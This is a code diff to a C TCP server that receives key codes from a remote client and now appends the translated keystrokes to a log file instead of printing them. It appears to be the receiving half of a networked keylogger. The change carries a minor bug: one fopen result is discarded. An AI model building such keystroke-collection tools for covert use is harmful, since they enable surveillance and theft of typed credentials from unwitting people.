@@ -48,6 +48,23 @@ const char* translate_key(int keycode) {
     return "<UNK>"; 
 }
 
+void write_to_file(KeyPackage *package){
+    const char *translated_char = translate_key(package->key_code);
+    FILE *file;
+    file = fopen("log-client.txt", "a");
+    if(file == NULL){
+        fopen("log-client.txt", "w");
+    }
+
+    if(file == NULL){
+        perror("failed to open log .txt file");
+        exit(EXIT_FAILURE);
+    }
+
+    fprintf(file, "%s", translated_char);
+    fclose(file);
+}
+
 int main(){
     // cria o ponto de comunicação inicial, devolve um file descriptor
     int server_socketFd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
@@ -96,9 +113,11 @@ int main(){
             printf("connection with client was gracefully closed\n"); 
             break; 
         }
-        const char *tchar = translate_key(received_package.key_code);
-        printf("%s", tchar);
-        fflush(stdout);
+
+        write_to_file(&received_package);
+        //const char *tchar = translate_key(received_package.key_code);
+        //printf("%s", tchar);
+        //fflush(stdout);
         //printf("key code: %d | status: %d\n", received_package.key_code, received_package.is_pressed);
     }
 
